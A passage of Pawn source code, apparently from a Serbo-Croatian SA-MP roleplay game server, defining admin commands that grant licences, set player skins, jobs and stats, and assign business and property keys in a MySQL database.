		SendInfoMessage( playerid, "Dali ste dozvolu za oruzje igracu %s.", ImeIgraca( id ) );
		SendInfoMessage( id, "Admin %s vam je dao dozvolu za oruzje.", ImeIgraca( playerid ) );
	}
	else if( strcmp( item, "all", true ) == 0 )
	{
	    PlayerInfo[ id ][ xVozacka ] = 1;
	    PlayerInfo[ id ][ xBrodska ] = 1;
        PlayerInfo[ id ][ xLetelica ] = 1;
		PlayerInfo[ id ][ xGunLicense ] = 1;
		sql_user_update_integer( id, "vehicle_license", PlayerInfo[ id ][ xVozacka ] );
		sql_user_update_integer( id, "boat_license", PlayerInfo[ id ][ xBrodska ] );
		sql_user_update_integer( id, "air_license", PlayerInfo[ id ][ xLetelica ] );
		sql_user_update_integer( id, "gun_license", PlayerInfo[ id ][ xGunLicense ] );
		SendInfoMessage( playerid, "Dali ste dozvole za sve igracu %s.", ImeIgraca( id ) );
		SendInfoMessage( id, "Admin %s vam je dao dozvole za sve.", ImeIgraca( playerid ) );
	}
	else
	{
		SendUsageMessage( playerid, "/adajdozvolu [kategorija] [ID/Ime igraca]");
     	SendClientMessage( playerid, -1, "[Kategorije] kopno, voda, zrak, oruzje");
	}
	return 1;
}
alias:adajdozvolu("agl");

CMD:askiniorgkaznu( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 7 || PlayerInfo[ playerid ][ xSkriptaRank ] == 4 )
	{
	    //if( PlayerInfo[ playerid ][ xAdmin ] <= 5 && !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti." );

		new id;
		if( sscanf( params, "r", id ) ) return SendUsageMessage( playerid, "/askiniorgkaznu [id]"); 
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru." );

		PlayerInfo[ id ][ xKazneniUgovor ] = 0;
		sql_user_update_integer( id, "org_punishment", PlayerInfo[ id ][ xKazneniUgovor ] );
		SCMF( id, 0x33CCFFFF, "#ORG: {FFFFFF}Admin {33CCFF}%s {FFFFFF}vam je skinuo org kaznu.",ImeIgraca( playerid ) );
		SCMF( playerid, 0x33CCFFFF, "#ORG: {FFFFFF}Skinuli ste igracu {33CCFF}%s {FFFFFF}org kaznu.", ImeIgraca( id ) );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
    return 1;
}

CMD:skiniorgkaznu( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xKazneniUgovor ] != 0 )
	{
        if( !IsPlayerInRangeOfPoint( playerid, 2.0, -1873.1704, 2670.5789, 3.5904)) return SendErrorMessage( playerid, "Morate biti u opstini.");

		PlayerInfo[ playerid ][ xKazneniUgovor ] = 0;
		sql_user_update_integer( playerid, "org_punishment", PlayerInfo[ playerid ][ xKazneniUgovor ] );
		DajIgracuNovac( playerid, -100000 );

		SendInfoMessage( playerid, "Platili ste 100000$ da skinete org kaznu." );
	}
	else return SendErrorMessage( playerid, "Nemate kazneni ugovor.");
    return 1;
}

CMD:setskin( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 5 )
	{
	    //if( PlayerInfo[ playerid ][ xAdmin ] <= 5 && !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti." );

		new id, kolicina;
		if( sscanf( params, "ri", id, kolicina ) ) return SendUsageMessage( playerid, "/setskin [id] [skin]" );
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru." );
		if( kolicina < 1 || kolicina > 311 ) return SendErrorMessage( playerid, "Broj skina ide od 1 do 311." );

		PostaviIgracuSkin( id, kolicina );
		SMG_SetPlayerSkin( id, kolicina );

	    SCMF( id, 0x33CCFFFF, "#SKIN: {FFFFFF}Admin {33CCFF}%s {FFFFFF}vam je postavio skin ID {33CCFF}(%d).", ImeIgraca( playerid ), kolicina );
		SCMF( playerid, 0x33CCFFFF, "#SKIN: {FFFFFF}Postavili ste igracu {33CCFF}%s {FFFFFF}skin ID {33CCFF}(%d).", ImeIgraca( id ), kolicina );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
	return 1;
}

CMD:setjob( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 3 )
	{
	    //if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti." );
		new id, kolicina;
		if( sscanf( params, "ui", id, kolicina ) )
		{
		    SendUsageMessage( playerid, "/setjob [id] [posao]");
		    SendUsageMessage( playerid, "Posao '0' znaci da skidas posao." );
		    SendUsageMessage( playerid, "1. Mehanicar | 2. P.Municije | 3. Pilot | 4. Rudar | 5. Prevoznik Novca | 6: Uber | 7: Proizvodac Namjestaja" );
		    return 1;
		}
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru." );
		if( kolicina < 0 || kolicina > 7 ) return SendErrorMessage( playerid, "Broj posla moze od 0 do 7." );
		PlayerInfo[ id ][ xPosao ] = kolicina;

		new q[ 128 ];
		mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `job_id` = '%d' WHERE `user_id` = '%d' LIMIT 1", PlayerInfo[ id ][ xPosao ], PlayerInfo[ id ][ xID ] );
		mysql_tquery( mSQL, q );

	    SCMF( id, 0x33CCFFFF, "#JOB: {FFFFFF}Admin {33CCFF}%s {FFFFFF}vam je postavio posao ID {33CCFF}(%d).", ImeIgraca( playerid ), kolicina );
		SCMF( playerid, 0x33CCFFFF, "#JOB: {FFFFFF}Postavili ste igracu {33CCFF}%s {FFFFFF}posao ID {33CCFF}(%d).", ImeIgraca( id ), kolicina );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
	return 1;
}

CMD:dajdrogu( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] < 6 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");

	new playerID, kolicina;
    if( sscanf( params, "ud", playerID, kolicina ) )
	{
		SendUsageMessage( playerid, "/dajdrogu [id] [kolicina]");
		return 1;
	}
	if( playerID == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
	if( kolicina >= 1 && kolicina <= 500 )
	{
		if( (PlayerInfo[playerID][xTorba_Droga]+kolicina) <= 100000 )
		{
		    PlayerInfo[playerID][xTorba_Droga] += kolicina;
		    sql_user_update_integer(playerID, "xTorba_Droga", PlayerInfo[playerID][xTorba_Droga]);

			SendInfoMessage( playerID, "%s %s vam je dao %dg droge.", getAdminRankNameInChat( playerid ), ImeIgraca( playerid ), kolicina );
			SendInfoMessage( playerid, "Dali ste %s %dg droge.", ImeIgraca( playerID ), kolicina );
		}
		else SendErrorMessage( playerid, "Igracu je puna torba droge." );
	}
	else return SendErrorMessage( playerid, "Kolicina ne moze biti ispod 1 ili iznad 500." );
    return 1;
}

CMD:setstat( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
	new odabir[20], id, kolicina;
	if( sscanf( params, "us[20]i", id, odabir, kolicina ) )
	{
		SendUsageMessage( playerid, "/setstat [id] [opcija] [kolicina]");
     	SendClientMessage( playerid, -1, "[OPCIJE] level | skin | pol | godine | posao | firma");
     	SendClientMessage( playerid, -1, "[OPCIJE] respekt | upoen | tiki | brojtelefona");
     	SendClientMessage( playerid, -1, "[OPCIJE] imovina1 | imovina2 | imovina3");
		SendClientMessage( playerid, CRVENA, "Da bi igrac bio bez imovine, firme kljuc trebate staviti na {FF0000}0");
		return 1;
	}
	if(id == INVALID_PLAYER_ID) return SendErrorMessage(playerid, "Taj ID nije ulogovan.");
	if( strcmp( odabir, "level", true ) == 0 )
	{
   		PlayerInfo[ id ][ xLevel ] = kolicina;
  		SetPlayerScore( id, kolicina );
   		sql_user_update_integer( id, "level", PlayerInfo[ id ][ xLevel ] );

        SCMF( id, 0x33CCFFFF, "#SETSTAT: {FFFFFF}Admin {33CCFF}%s {FFFFFF}vam je postavi%s level {33CCFF}(%d).", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), kolicina );
		SCMF( playerid, 0x33CCFFFF, "#SETSTAT: {FFFFFF}Postavili ste igracu {33CCFF}%s {FFFFFF}level {33CCFF}(%d).", ImeIgraca( id ), kolicina );
 
		AdminMsgForLevel(7, ADM_WARN, "[ADMIN] Admin %s je postavi%s level %d igracu %s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), kolicina, ImeIgraca( id ));
		WriteLog("log-setstat", "Admin %s je postavi%s level %d igracu %s.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), kolicina, ImeIgraca(id));
	}
	else if( strcmp( odabir, "upoen", true ) == 0 )
	{
   		PlayerInfo[ id ][ xUPoen ] = kolicina;
        sql_user_update_integer( id, "xUPoen", PlayerInfo[ id ][ xUPoen ] );

        SCMF( id, 0x33CCFFFF, "#SETSTAT: {FFFFFF}Admin {33CCFF}%s {FFFFFF}vam je postavi%s U-Poen {33CCFF}(%d).", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), kolicina );
		SCMF( playerid, 0x33CCFFFF, "#SETSTAT: {FFFFFF}Postavili ste igracu {33CCFF}%s {FFFFFF}U-Poen {33CCFF}(%d).", ImeIgraca( id ), kolicina );
 
		AdminMsgForLevel(7, ADM_WARN, "[ADMIN] Admin %s je postavi%s U-Poen %d igracu %s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), kolicina, ImeIgraca( id ));
		WriteLog("log-setstat", "Admin %s je postavi%s U-Poen %d igracu %s.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), kolicina, ImeIgraca(id));
	}
	else if( strcmp( odabir, "tiki", true ) == 0 )
	{
   		PlayerInfo[ id ][ xTiki ] = kolicina;
        sql_user_update_integer( id, "xTiki", PlayerInfo[ id ][ xTiki ] );

        SCMF( id, 0x33CCFFFF, "#SETSTAT: {FFFFFF}Admin {33CCFF}%s {FFFFFF}vam je postavi%s Tiki's {33CCFF}(%d).", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), kolicina );
		SCMF( playerid, 0x33CCFFFF, "#SETSTAT: {FFFFFF}Postavili ste igracu {33CCFF}%s {FFFFFF}Tiki's {33CCFF}(%d).", ImeIgraca( id ), kolicina );
 
		AdminMsgForLevel(7, ADM_WARN, "[ADMIN] Admin %s je postavi%s Tiki's %d igracu %s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), kolicina, ImeIgraca( id ) );
		WriteLog("log-setstat", "Admin %s je postavi%s Tiki's %d igracu %s.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), kolicina, ImeIgraca(id));
	}
	else if( strcmp( odabir, "brojtelefona", true ) == 0 )
	{
		if((kolicina < 100 || kolicina > 999999) && kolicina != 0) return SendErrorMessage( playerid, "Broj moze ici od 100 do 999999(3-6 cifara) ili 0 da resetujes." );

		PlayerInfo[ id ][ xBrojTelefona ] = kolicina;
        sql_user_update_integer( id, "phone_number", PlayerInfo[ id ][ xBrojTelefona ] );
        SCMF( id, 0x33CCFFFF, "#SETSTAT: {FFFFFF}Admin {33CCFF}%s {FFFFFF}je postavi%s broj telefona {33CCFF}(%d).", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), kolicina );
		SCMF( playerid, 0x33CCFFFF, "#SETSTAT: {FFFFFF}Postavili ste igracu {33CCFF}%s {FFFFFF}broj telefona {33CCFF}(%d).", ImeIgraca( id ), kolicina );
 
		AdminMsgForLevel(7, ADM_WARN, "[ADMIN] Admin %s je postavi%s broj telefona %d igracu %s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), kolicina, ImeIgraca( id ));
		WriteLog("log-setstat", "Admin %s je postavi%s broj telefona %d igracu %s.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), kolicina, ImeIgraca(id));
	}
	else if(strcmp(odabir, "skin", true) == 0)
	{
		if( kolicina < 1 || kolicina > 311 ) return SendErrorMessage( playerid, "Broj skina ide od 1 do 311 ili od 20001 do 30000." );

		PostaviIgracuSkin( id, kolicina );
		SMG_SetPlayerSkin( id, kolicina );
        SCMF( id, 0x33CCFFFF, "#SETSTAT: {FFFFFF}Admin {33CCFF}%s {FFFFFF}je postavi%s skin ID {33CCFF}(%d).", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), kolicina );
		SCMF( playerid, 0x33CCFFFF, "#SETSTAT: {FFFFFF}Postavili ste igracu {33CCFF}%s {FFFFFF}skin ID {33CCFF}(%d).", ImeIgraca( id ), kolicina );
 
		AdminMsgForLevel(7, ADM_WARN, "[ADMIN] Admin %s je postavi%s skin %d igracu %s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), kolicina, ImeIgraca( id ));
		WriteLog("log-setstat", "Admin %s je postavi%s skin %d igracu %s.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), kolicina, ImeIgraca(id));
	}
	else if(strcmp(odabir,"godine",true) == 0)
	{
	    PlayerInfo[ id ][ xGodine ] = kolicina;
		sql_user_update_integer( id, "age", PlayerInfo[ id ][ xGodine ] );

        SCMF( id, 0x33CCFFFF, "#SETSTAT: {FFFFFF}Admin {33CCFF}%s {FFFFFF}je postavi%s godine {33CCFF}(%d).", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), kolicina );
		SCMF( playerid, 0x33CCFFFF, "#SETSTAT: {FFFFFF}Postavili ste igracu {33CCFF}%s {FFFFFF}godine {33CCFF}(%d).", ImeIgraca( id ), kolicina );
 
		AdminMsgForLevel(7, ADM_WARN, "[ADMIN] Admin %s je postavi%s godine na %d igracu %s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), kolicina, ImeIgraca( id ));
		WriteLog("log-setstat", "Admin %s je postavi%s godine %d igracu %s.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), kolicina, ImeIgraca(id));
	}
	else if(strcmp(odabir,"pol",true) == 0)
	{
		if( kolicina == 1 )
		{
		    PlayerInfo[ id ][ xPol ] = kolicina;
		    sql_user_update_integer( id, "sex", PlayerInfo[ id ][ xPol ] );

	        SCMF( id, 0x33CCFFFF, "#SETSTAT: {FFFFFF}Admin {33CCFF}%s {FFFFFF}je postavi%s pol {33CCFF}'musko'.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
			SCMF( playerid, 0x33CCFFFF, "#SETSTAT: {FFFFFF}Postavili ste igracu {33CCFF}%s {FFFFFF}pol {33CCFF}'musko'.", ImeIgraca( id ) );
 
			AdminMsgForLevel(7, ADM_WARN, "[ADMIN] Admin %s je postavi%s muski pol igracu %s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( id ));
			WriteLog("log-setstat", "Admin %s postavi%s je muski pol igracu %s.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), ImeIgraca(id));
		}
		else if( kolicina == 2 )
		{
			PlayerInfo[ id ][ xPol ] = kolicina;
		    sql_user_update_integer( id, "sex", PlayerInfo[ id ][ xPol ] );

	        SCMF( id, 0x33CCFFFF, "#SETSTAT: {FFFFFF}Admin {33CCFF}%s {FFFFFF}je postavi%s pol {33CCFF}'zensko'.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
			SCMF( playerid, 0x33CCFFFF, "#SETSTAT: {FFFFFF}Postavili ste igracu {33CCFF}%s {FFFFFF}pol {33CCFF}'zensko'.", ImeIgraca( id ) );
 
			AdminMsgForLevel(7, ADM_WARN, "[ADMIN] Admin %s je postavi%s zenski pol igracu %s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( id ));
			WriteLog("log-setstat", "Admin %s je postavi%s zenski pol igracu %s.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), ImeIgraca(id));
		}
		else SendErrorMessage(playerid, "1 - Musko | 2 - Zensko");
	}
	else if(strcmp(odabir,"posao",true) == 0)
	{
	    PlayerInfo[ id ][ xPosao ] = kolicina;

		new q[ 128 ];
		mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `job_id` = '%d' WHERE `user_id` = '%d' LIMIT 1",
				PlayerInfo[ id ][ xPosao ],
				PlayerInfo[ id ][ xID ] );
		mysql_tquery( mSQL, q );

        SCMF( id, 0x33CCFFFF, "#SETSTAT: {FFFFFF}Admin {33CCFF}%s {FFFFFF}je postavi%s posao {33CCFF}(%d).", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), kolicina );
		SCMF( playerid, 0x33CCFFFF, "#SETSTAT: {FFFFFF}Postavili ste igracu {33CCFF}%s {FFFFFF}posao {33CCFF}(%d).", ImeIgraca( id ), kolicina );
 
		AdminMsgForLevel(7, ADM_WARN, "[ADMIN] Admin %s je postavi%s posao %d igracu %s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), kolicina, ImeIgraca( id ));
		WriteLog("log-setstat", "Admin %s je postavi%s posao %d igracu %s.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), kolicina, ImeIgraca(id));
	}
	else if(strcmp(odabir,"respekt",true) == 0)
	{
		if( PlayerInfo[ playerid ][ xAdmin ] < 5) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");

	    PlayerInfo[ id ][ xRespekt ] = kolicina;
	    sql_user_update_integer( id, "exp", PlayerInfo[ id ][ xRespekt ] );

        SCMF( id, 0x33CCFFFF, "#SETSTAT: {FFFFFF}Admin {33CCFF}%s {FFFFFF}je postavi%s respekte na {33CCFF}(%d).", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), kolicina );
		SCMF( playerid, 0x33CCFFFF, "#SETSTAT: {FFFFFF}Postavili ste igracu {33CCFF}%s {FFFFFF}respekte na {33CCFF}(%d).", ImeIgraca( id ), kolicina );
 
		AdminMsgForLevel(7, ADM_WARN, "[ADMIN] Admin %s je postavi%s respekte na %d igracu %s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), kolicina, ImeIgraca( id ));
		WriteLog("log-setstat", "Admin %s je postavi%s respekte %d igracu %s.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), kolicina, ImeIgraca(id));
	}
	else if(strcmp(odabir,"firma",true) == 0)
	{
		if( kolicina == 0 )
		{
			PlayerInfo[ id ][ xFirmaID ] = kolicina;
			PlayerInfo[ id ][ xBussinesSqlID ] = 0;
			sql_user_update_integer( id, "bussines_id", PlayerInfo[ id ][ xBussinesSqlID ] );

			SCMF( id, 0x33CCFFFF, "#SETSTAT: {FFFFFF}Admin {33CCFF}%s {FFFFFF}vam je skinu%s kljuc firme.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
			SCMF( playerid, 0x33CCFFFF, "#SETSTAT: {FFFFFF}Skinuli ste igracu {33CCFF}%s {FFFFFF}kljuc firme.", ImeIgraca( id ) );
 
			AdminMsgForLevel(7, ADM_WARN, "[ADMIN] Admin %s je skinu%s kljuc firme igracu %s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( id ));
			WriteLog("log-setstat", "Admin %s je skinu%s kljuc firme igracu %s.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), ImeIgraca(id));
		}
		else
		{
		    if( BusinessInfo[ kolicina ][ b_ID ] == 0 ) return SendErrorMessage( playerid, "Ta firma(ID) ne postoji u bazi podataka!");

			PlayerInfo[ id ][ xFirmaID ] = kolicina;
			PlayerInfo[ id ][ xBussinesSqlID ] = BusinessInfo[ kolicina ][ b_ID ];
			sql_user_update_integer( id, "bussines_id", PlayerInfo[ id ][ xBussinesSqlID ] );
			SCMF( id, 0x33CCFFFF, "#SETSTAT: {FFFFFF}Admin {33CCFF}%s {FFFFFF}vam je postavi%s kljuc firme {33CCFF}(%d).", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), kolicina );
			SCMF( playerid, 0x33CCFFFF, "#SETSTAT: {FFFFFF}Postavili ste igracu {33CCFF}%s {FFFFFF}kljuc firme {33CCFF}(%d).", ImeIgraca( id ), kolicina );
			BusinessInfo[ kolicina ][ bOwner_sqlID ] = PlayerInfo[ id ][ xID ];
			BusinessInfo[ kolicina ][ bOnAuction ] = false;
			BusinessInfo[ kolicina ][ bLocked ] = 0;
			BusinessInfo[ kolicina ][ bNeaktivnost ] = 0;
			BusinessInfo[ kolicina ][ bFacture ] = 100;
			strmid( BusinessInfo[ kolicina ][ bOwner ], ImeIgraca( id ), 0, strlen( ImeIgraca( id ) ), 32);
			Bussines_Refresh( kolicina );

			new q[ 256 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `bussines` SET `b_owner_sqlID` = '%d', `bOnAuction` = '0', `bOwner` = '%s', `b_neaktivnost` = '%d', `b_facture` = '%d' WHERE `bussines_id` = '%d'",
					BusinessInfo[ kolicina ][ bOwner_sqlID ],
					BusinessInfo[ kolicina ][ bOwner ],
					BusinessInfo[ kolicina ][ bNeaktivnost ],
					BusinessInfo[ kolicina ][ bFacture ], BusinessInfo[ kolicina ][ b_ID ] );

		   	mysql_tquery( mSQL, q );
 
			AdminMsgForLevel(7, ADM_WARN, "[ADMIN] Admin %s je postavi%s kljuc firme na %d igracu %s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), kolicina, ImeIgraca( id ));
			WriteLog("log-setstat", "Admin %s je postavi%s kljuc firme %d igracu %s.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), kolicina, ImeIgraca(id));
		}
	}
	else if(strcmp(odabir, "imovina1", true) == 0)
	{
		if( kolicina == 0 )
		{
			PlayerInfo[ id ][ xProperty ][ 0 ] = kolicina;
			PlayerInfo[ id ][ xPropertySqlID ][ 0 ] = 0;
			sql_user_update_integer( id, "property_id_1", PlayerInfo[ id ][ xPropertySqlID ][ 0 ] );

			SCMF( id, 0x33CCFFFF, "#SETSTAT: {FFFFFF}Admin {33CCFF}%s {FFFFFF}vam je skinu%s kljuc imovine 1.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
			SCMF( playerid, 0x33CCFFFF, "#SETSTAT: {FFFFFF}Skinuli ste igracu {33CCFF}%s {FFFFFF}kljuc imovine.", ImeIgraca( id ) );
 
			AdminMsgForLevel(7, ADM_WARN, "[ADMIN] Admin %s je skinu%s kljuc imovine1 igracu %s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( id ));
			WriteLog("log-setstat", "Admin %s je skinu%s kljuc imovine 1 igracu %s.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), ImeIgraca(id));
		}
		else
		{
		    if( II[kolicina][iSQLID] == 0 ) return SendErrorMessage( playerid, "Ta imovina ne postoji." );

			PlayerInfo[ id ][ xProperty ][ 0 ] = kolicina;
			PlayerInfo[ id ][ xPropertySqlID ][ 0 ] = II[kolicina][iSQLID];
			sql_user_update_integer( id, "property_id_1", PlayerInfo[ id ][ xPropertySqlID ][ 0 ] );

			SCMF( id, 0x33CCFFFF, "#SETSTAT: {FFFFFF}Admin {33CCFF}%s {FFFFFF}vam je postavi%s kljuc imovine 1 {33CCFF}(%d).", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), kolicina );
			SCMF( playerid, 0x33CCFFFF, "#SETSTAT: {FFFFFF}Postavili ste igracu {33CCFF}%s {FFFFFF}kljuc imovine 1 {33CCFF}(%d).", ImeIgraca( id ), kolicina );

			II[ kolicina ][ iOwned ] = 1;
			II[ kolicina ][ iOnAuction ] = false;
			II[ kolicina ][ iOwnerSQLID ] = PlayerInfo[id][xID];
			II[ kolicina ][ iLocked ] = 0;
			II[ kolicina ][ iNeaktivnost ] = 0;
			strmid( II[ kolicina ][ iOwner ], ImeIgraca( id ), 0, strlen( ImeIgraca( id ) ), 25);
			SaveProperty( kolicina );
			PropertyRefresh( kolicina );
 
			AdminMsgForLevel(7, ADM_WARN, "[ADMIN] Admin %s je postavi%s kljuc imovine 1 na %d igracu %s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), kolicina, ImeIgraca( id ));
			WriteLog("log-setstat", "Admin %s je postavi%s kljuc imovine 1 %d igracu %s.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), kolicina, ImeIgraca(id));
		}
	}
	else if(strcmp(odabir,"imovina2",true) == 0)
	{
		if( kolicina == 0 )
		{
			PlayerInfo[ id ][ xProperty ][ 1 ] = kolicina;
			PlayerInfo[ id ][ xPropertySqlID ][ 1 ] = II[kolicina][iSQLID];
			sql_user_update_integer( id, "property_id_2", PlayerInfo[ id ][ xPropertySqlID ][ 1 ] );

			SCMF( id, 0x33CCFFFF, "#SETSTAT: {FFFFFF}Admin {33CCFF}%s {FFFFFF}vam je skinu%s kljuc imovine 2.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
			SCMF( playerid, 0x33CCFFFF, "#SETSTAT: {FFFFFF}Skinuli ste igracu {33CCFF}%s {FFFFFF}kljuc imovine 2.", ImeIgraca( id ) );
 
			AdminMsgForLevel(8, ADM_WARN, "[ADMIN] Admin %s je skinu%s kljuc imovine2 igracu %s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( id ));
			WriteLog("log-setstat", "Admin %s je skinu%s kljuc imovine 2 igracu %s.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), ImeIgraca(id));
		}
		else
		{
		    if( II[kolicina][iSQLID] == 0 ) return SendErrorMessage( playerid, "Ta imovina ne postoji." );
			PlayerInfo[ id ][ xProperty ][ 1 ] = kolicina;
			PlayerInfo[ id ][ xPropertySqlID ][ 1 ] = II[kolicina][iSQLID];
			sql_user_update_integer( id, "property_id_2", PlayerInfo[ id ][ xPropertySqlID ][ 1 ] );

			SCMF( id, 0x33CCFFFF, "#SETSTAT: {FFFFFF}Admin {33CCFF}%s {FFFFFF}vam je postavi%s kljuc imovine 2 {33CCFF}(%d).", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), kolicina );
			SCMF( playerid, 0x33CCFFFF, "#SETSTAT: {FFFFFF}Postavili ste igracu {33CCFF}%s {FFFFFF}kljuc imovine 2 {33CCFF}(%d).", ImeIgraca( id ), kolicina );

			II[ kolicina ][ iOwned ] = 1;
			II[ kolicina ][ iOnAuction ] = false;
			II[ kolicina ][ iOwnerSQLID ] = PlayerInfo[id][xID];
			II[ kolicina ][ iLocked ] = 0;
			II[ kolicina ][ iNeaktivnost ] = 0;
			strmid( II[ kolicina ][ iOwner ], ImeIgraca( id ), 0, strlen( ImeIgraca( id ) ), 32);
			SaveProperty( kolicina );
			PropertyRefresh( kolicina );
 
			AdminMsgForLevel(7, ADM_WARN, "[ADMIN] Admin %s je postavi%s kljuc imovine 2 na %d igracu %s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), kolicina, ImeIgraca( id ));
			WriteLog("log-setstat", "Admin %s je postavi%s kljuc imovine 2 %d igracu %s.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), kolicina, ImeIgraca(id));
		}
	}
	else if(strcmp(odabir,"imovina3",true) == 0)
	{
		if( kolicina == 0 )
		{
			PlayerInfo[ id ][ xProperty ][ 2 ] = kolicina;
			PlayerInfo[ id ][ xPropertySqlID ][ 2 ] = II[kolicina][iSQLID];
			sql_user_update_integer( id, "property_id_3", PlayerInfo[ id ][ xPropertySqlID ][ 2 ] );

			SCMF( id, 0x33CCFFFF, "#SETSTAT: {FFFFFF}Admin {33CCFF}%s {FFFFFF}vam je skinu%s kljuc imovine 3.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
			SCMF( playerid, 0x33CCFFFF, "#SETSTAT: {FFFFFF}Skinuli ste igracu {33CCFF}%s {FFFFFF}kljuc imovine 3.", ImeIgraca( id ) );
 
			AdminMsgForLevel(7, ADM_WARN, "[ADMIN] Admin %s je skinu%s kljuc imovine3 igracu %s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( id ));
			WriteLog("log-setstat", "Admin %s je skinu%s kljuc imovine 3 igracu %s.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), ImeIgraca(id));
		}
		else
		{
		    if( II[kolicina][iSQLID] == 0 ) return SendErrorMessage( playerid, "Ta imovina ne postoji." );
			PlayerInfo[ id ][ xProperty ][ 2 ] = kolicina;
			PlayerInfo[ id ][ xPropertySqlID ][ 2 ] = II[kolicina][iSQLID];
			sql_user_update_integer( id, "property_id_3", PlayerInfo[ id ][ xPropertySqlID ][ 2 ] );

			SCMF( id, 0x33CCFFFF, "#SETSTAT: {FFFFFF}Admin {33CCFF}%s {FFFFFF}vam je postavi%s kljuc imovine 3 {33CCFF}(%d).", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), kolicina );
			SCMF( playerid, 0x33CCFFFF, "#SETSTAT: {FFFFFF}Postavili ste igracu {33CCFF}%s {FFFFFF}kljuc imovine 3 {33CCFF}(%d).", ImeIgraca( id ), kolicina );

			II[ kolicina ][ iOwned ] = 1;
			II[ kolicina ][ iOnAuction ] = false;
			II[ kolicina ][ iLocked ] = 0;
			II[ kolicina ][ iOwnerSQLID ] = PlayerInfo[id][xID];
			II[ kolicina ][ iNeaktivnost ] = 0;
			strmid( II[ kolicina ][ iOwner ], ImeIgraca( id ), 0, strlen( ImeIgraca( id ) ), 32);
			SaveProperty( kolicina );
			PropertyRefresh( kolicina );
 
			AdminMsgForLevel(7, ADM_WARN, "[ADMIN] Admin %s je postavi%s kljuc imovine 3 na %d igracu %s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), kolicina, ImeIgraca( id ));
			WriteLog("log-setstat", "Admin %s je postavi%s kljuc imovine 3 %d igracu %s.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), kolicina, ImeIgraca(id));
		}
	}
	return 1;
}

